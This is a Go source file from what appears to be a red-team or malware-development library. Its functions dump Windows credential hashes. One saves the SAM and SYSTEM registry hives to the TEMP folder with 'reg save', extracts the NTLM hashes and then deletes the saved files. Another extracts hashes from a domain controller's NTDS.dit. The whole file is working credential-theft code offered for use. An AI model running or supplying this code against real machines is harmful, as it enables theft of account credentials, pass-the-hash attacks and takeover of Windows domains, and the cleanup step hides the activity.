package redteam

/*

References:
https://github.com/C-Sto/gosecretsdump

type DumpedHash struct {
	Username string
	LMHash   []byte
	NTHash   []byte
	Rid      uint32
	Enabled  bool
	UAC      uacFlags
  Supp     SuppInfo
  History  PwdHistory
}

*/

import (
  "encoding/hex"
  "strconv"
  "errors"
  "time"
  "sync"
  "fmt"
  "os"

  "github.com/D3Ext/maldev/system"
  "github.com/D3Ext/maldev/exec"
  "github.com/C-Sto/gosecretsdump/pkg/samreader"
  "github.com/C-Sto/gosecretsdump/pkg/ditreader"
)

type Hash struct {
  Username    string
  LM          []byte
  NT          []byte
  Rid         uint32
  Enabled     bool
  Supp        ditreader.SuppInfo
}

func (h Hash) Format() (string) {
  // Example NTLM hash: Jason:502:aad3c435b514a4eeaad3b935b51304fe:c46b9e588fa0d112de6f59fd6d58eae3:::
  // First part is the username, then the account RID, the LM and the NT
  return h.Username + ":" + strconv.Itoa(int(h.Rid)) + ":" + hex.EncodeToString(h.LM) + ":" + hex.EncodeToString(h.NT) + ":::"
}

func AutoDumpHashes() ([]Hash, error) {
  var hashes []Hash

  privs_check, err := system.GetUserPrivs()
  if err != nil {
    return hashes, err
  }

  if (privs_check == false) {
    return hashes, errors.New("this operation requires elevated privileges, cancelling!")
  }

  go func (){
    o := exec.ExecutePowershell("reg save HKLM\\SAM " + os.Getenv("TEMP") + "\\sam") // Save SAM and SYSTEM registry
    o = exec.ExecutePowershell("reg save HKLM\\SYSTEM " + os.Getenv("TEMP") + "\\system")
    o = ""
    fmt.Print(o)
  }()
  time.Sleep(2000 * time.Millisecond)

  hashes, err = DumpSamHashes(os.Getenv("TEMP") + "\\system", os.Getenv("TEMP") + "\\sam") // Dump hashes
  if err != nil {
    return hashes, err
  }

  // Remove previously created files
  err = os.Remove(os.Getenv("TEMP") + "\\sam")
  if err != nil {
    return hashes, err
  }

  err = os.Remove(os.Getenv("TEMP") + "\\system")
  if err != nil {
    return hashes, err
  }

  // Return hashes w/o errors
  return hashes, nil
}

func DumpSamHashes(system_file string, sam_file string) ([]Hash, error) {
  var all_hashes []Hash

  privs_check, err := system.GetUserPrivs()
  if err != nil {
    return all_hashes, err
  }

  if (privs_check == false) {
    return all_hashes, errors.New("this operation requires elevated privileges!")
  }

  dr, err := samreader.New(system_file, sam_file) // Read both SAM and SYSTEM
  if err != nil {
    return all_hashes, err
  }
  dataChan := dr.GetOutChan()

  // Start dumping
  go dr.Dump()

  wg := sync.WaitGroup{}
  wg.Add(1)
  go func(){
    defer wg.Done()
    for dh := range dataChan {
      new_hash := Hash{
        Username: dh.Username,
        LM: dh.LMHash,
        NT: dh.NTHash,
        Rid: dh.Rid,
        Enabled: dh.Enabled,
        Supp: dh.Supp,
      }

      all_hashes = append(all_hashes, new_hash)
    }
  }()
  wg.Wait()

  return all_hashes, nil
}

func DumpDitHashes(system_file string, ntds_file string) ([]Hash, error) {
  var all_hashes []Hash

  privs_check, err := system.GetUserPrivs()
  if err != nil {
    return all_hashes, err
  }

  if (privs_check == false) {
    return all_hashes, errors.New("this operation requires elevated privileges!")
  }

  dr, err := ditreader.New(system_file, ntds_file) // Read both NTDS and SYSTEM
  if err != nil {
    return all_hashes, err
  }
  dataChan := dr.GetOutChan()

  // Start dumping
  go dr.Dump()

  wg := sync.WaitGroup{}
  wg.Add(1)
  go func(){
    defer wg.Done()
    for dh := range dataChan {
      new_hash := Hash{
        Username: dh.Username,
        LM: dh.LMHash,
        NT: dh.NTHash,
        Rid: dh.Rid,
        Enabled: dh.Enabled,
        Supp: dh.Supp,
      }

      all_hashes = append(all_hashes, new_hash)
    }
  }()
  wg.Wait()

  return all_hashes, nil
}



